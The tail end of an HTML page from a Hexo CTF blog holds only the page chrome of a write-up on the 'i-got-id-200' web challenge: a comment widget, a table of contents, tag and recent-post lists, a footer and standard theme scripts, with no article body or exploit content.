+                    <a title=" 攻防世界web进阶区unfinish详解" href="/2020/08/09/攻防世界web进阶区unfinish详解/">&lt; 上一篇</a>
+                </div>
+                
+                
+            </nav>
+        
+        
+            <div id="disqus_thread"></div>
+<script>
+    $(function(){
+        window.DISQUS = null;
+        new DisqusJS({
+            shortname: '',
+            siteName: '',
+            identifier: '2020/08/10/攻防世界web进阶区i-got-id-200超详解/',
+            url: 'http://wumingzhilian.github.to/2020/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAi-got-id-200%E8%B6%85%E8%AF%A6%E8%A7%A3/',
+            api: '',
+            apikey: '',
+            admin: '',
+            adminLabel: ''
+        });
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://github.com/SukkaW/DisqusJS">comments powered by DisqusJS.</a></noscript>
+        
+    </article>
+</section>
+</div>
+        
+            <section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+                
+                    <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.png" />
+        </div>
+    </div>
+    <div class="textwidget">
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#param"><span class="toc-number">1.1.1.</span> <span class="toc-text">param()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.3.</span> <span class="toc-text">构造远程执行代码</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+                    <!-- Moved to about.ejs -->
+                
+                    
+  <aside id="krw-categories" class="widget widget-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS-Labs/">XSS-Labs</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+                
+                    
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/CTF/" style="font-size: 0.67em;">CTF</a> <a href="/tags/WEB/" style="font-size: 0.6em;">WEB</a> <a href="/tags/XSS-Labs/" style="font-size: 0.6em;">XSS-Labs</a> <a href="/tags/web%E8%BF%9B%E9%98%B6%E5%8C%BA/" style="font-size: 0.73em;">web进阶区</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.8em;">攻防世界</a>
+      </div>
+  </aside>
+
+                
+                    
+  <aside id="krw-posts" class="widget widget-kratos-poststab">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+          <a class="list-group-item" href="/2020/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAi-got-id-200%E8%B6%85%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区i-got-id-200超详解</a>
+        
+          <a class="list-group-item" href="/2020/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAunfinish%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区unfinish详解</a>
+        
+          <a class="list-group-item" href="/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAics-07%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区ics-07详解</a>
+        
+          <a class="list-group-item" href="/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAbug%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区bug详解</a>
+        
+          <a class="list-group-item" href="/2020/08/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BACat%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 攻防世界web进阶区Cat详解</a>
+        
+      </ul>
+  </div>
+  </aside>
+
+                
+            </section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer">
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/wumingzhilian"><i class="fa fa-telegram"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/wumingzhilian"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/wumingzhilian"><i class="fa fa-github"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="/atom.xml"><i class="fa fa-rss"></i></a></li>
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2020 wuming 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Made with <i class="fa fa-heart throb" style="color:#d43f57"></i> by <a href="https://candinya.com" target="_blank" rel="nofollow">Candinya</a>.</li>
+                        </div>
+                        <div>
+                            <li>Hosted by <a href="https://github.io" target="_blank">Github Pages</a></li>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+<script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    <div id="aplayer"></div>
+<script>
+$.ajax({
+    type:"get",
+    url:"",
+    dataType:"json",
+    success: function(data){
+        new APlayer({
+            container: document.getElementById('aplayer'),
+            fixed: true,
+            order: 'random',
+            lrcType: 3,
+            audio: data
+        });
+    }
+});
+</script>
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+</body>
+</html>
